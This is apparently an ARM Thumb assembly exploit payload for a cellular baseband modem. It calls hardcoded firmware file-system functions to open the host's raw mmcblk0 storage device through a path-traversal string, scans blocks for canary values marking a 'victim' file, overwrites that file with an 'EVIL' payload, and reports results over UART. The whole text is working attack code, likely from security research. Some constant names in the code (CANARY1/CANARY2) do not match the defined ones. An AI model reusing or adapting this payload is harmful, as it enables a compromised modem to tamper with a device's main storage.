@defines:
.set FORMAT_STR, 0x7053b5
.set MMCBLK_PATH, 0x7053b8
.set KAL_WSPRINTF, 0x3ba19f
.set RWO_FLAGS, 0x21010400
.set RO_FLAGS, 0x20700 @RO, SHARE, NODIR, AC
.set FS_OPEN, 0x103861 @kal_int32 MD_FS_Open(const WCHAR * FileName, kal_uint32 Flag);
.set FS_WRITE, 0x103B55 @kal_int32 MD_FS_Write(FS_HANDLE FileHandle, void *DataPtr, kal_uint32 Length, kal_uint32 *Written);
.set FS_CLOSE, 0x103989 @kal_int32 MD_FS_Close(FS_HANDLE FileHandle);
.set FS_READ, 0x103A65 @kal_int32 MD_FS_Read(FS_HANDLE FileHandle, void *DataPtr, kal_uint32 Length, kal_uint32 *Read);
.set FS_SEEK, 0x103C39 @kal_int32 MD_FS_Seek(FS_HANDLE FileHandle, kal_int32 Offset, kal_int32 Whence);
.set RMMI_WRITE_TO_UART, 0x3e32f1 @void rmmi_write_to_uart(kal_uint8* buffer, kal_uint16 length, kal_bool stuff);
.set BYE_STR, 0x72EC22
.set RMMI_FLUSH_UART, 0x3E85F5
.set CAN1, 0x434d5947
.set CAN2, 0x59524e41
.set EVIL, 0x4c495645
.set SEEK_BACK, 0xfffffe00 @ -512
.set TASK_SLEEP, 0x004C0E25

@reg names
arg1 .req r5
uart .req r4
fhl .req r7

.thumb
.thumb_func
@setup stack
patchfun:
push {r4-r7, lr}
mov r1, #1
lsl r1, #9
add r1, r1, #8
mov r2, sp
sub r2, r2, r1
mov sp, r2
@sub sp, sp, r1
@ save arg for later
ldr r5, [r0, #0xc]
str r5, [sp, #0x204]


@ move the path to stack as wchar
mov r0, sp
ldr r1, =FORMAT_STR @%s format string
ldr r2, =MMCBLK_PATH @ Z:../../../dev/mmclkb0
ldr r6, =KAL_WSPRINTF
blx r6

@ open the /dev/mmcblk raw device
@ with R/W permissions
@ open
mov r0, sp
ldr r1, =RWO_FLAGS
ldr r6, =FS_OPEN
blx r6
str r0, [sp]
mov fhl, r0

@ used to send back data to AT device
@ DBG print the received handler
mov r1, #4
mov r0, sp @print stack
mov r2, #1
ldr r6, =RMMI_WRITE_TO_UART
blx r6

@ running in RT task sleeping wont preempt
@preempt
@mov r0, #1
@lsl r0, #9
@ldr r6, =TASK_SLEEP
@blx r6

@ check if file handler not null
cmp fhl, #0
blt exit

mov r5, #4
@ first seek into the middle of mmcblk device
@ that is roughly where system starts
seek:
mov r0, fhl
mov r1, #1
lsl r1, #30
mov r2, #1 @0 begin 1 cur
ldr r6, =FS_SEEK
blx r6

@ we can only seek 2^31 so need to do it 4 times
sub r5, r5, #1
cmp r5, #0
bne seek

@ we can seek to the exact address of the
@ victim file if we know it, to speed up the
@ exploit, (for testing)
@mov r0, fhl
@ldr r1, =0x5e7f0000 @address of victim
@mov r2, #1 @0 begin 1 cur
@ldr r6, =FS_SEEK
@blx r6

@ keep reading from device until
@ the target is found
mov r5, #0
read:
mov r0, fhl @ file handler
mov r1, sp @ read to the stack
mov r2, #1 @ 512 bytes = 1 block
lsl r2, #9
mov r3, r2 
add r3, sp, r3 @ the number of bytes read
ldr r6, =FS_READ
blx r6

@ check if the read value contains the pattern
@ this is oversimplified
ldr r2, =CANARY1
ldr r1, [SP]
cmp r2, r1
bne isover
ldr r2, =CANARY2
ldr r1, [SP, #4]
cmp r2, r1
@ if the victim is found we can overwrite it
beq write

isover:
mov r1,#1
@ lsl r1, 24 is the entire range
@ works with 23
lsl r1,#15
add r5, r5, #1
cmp r5, r1
bne read
@ if we did not find the file just exit 
str r5, [sp]
b over

@ seek back a page
@ and overwrite the victim
write:
mov r0, fhl
ldr r1, =SEEK_BACK @ -512
mov r2, #1 @0 begin 1 cur
ldr r6, =FS_SEEK
blx r6

@ load the payload string "EVIL"
ldr r0, =EVIL
str r0, [sp]
@ and write it
mov r0, fhl @ file handler
mov r1, sp @ the payload
mov r2, #1 
lsl r2, #9 @ 512
mov r3, sp
add r3, r3, r2
ldr r6, =FS_WRITE
blx r6

over:
@trace
mov r1, #16
mov r0, sp @ print stack
mov r2, #1
ldr r6, =RMMI_WRITE_TO_UART
blx r6


@ close
mov r0, fhl
ldr r6, =FS_CLOSE
blx r6

exit:
@ print and flush
mov r1, #1
ldr r2, =BYE_STR
mov r3, #8
ldrb r0, [sp, #0x204]
ldr r6, =RMMI_FLUSH_UART
blx r6

@ epilogue
mov r1, #1
lsl r1, #9
add r1, r1, #8
add sp, sp, r1
pop {r4-r7, pc}
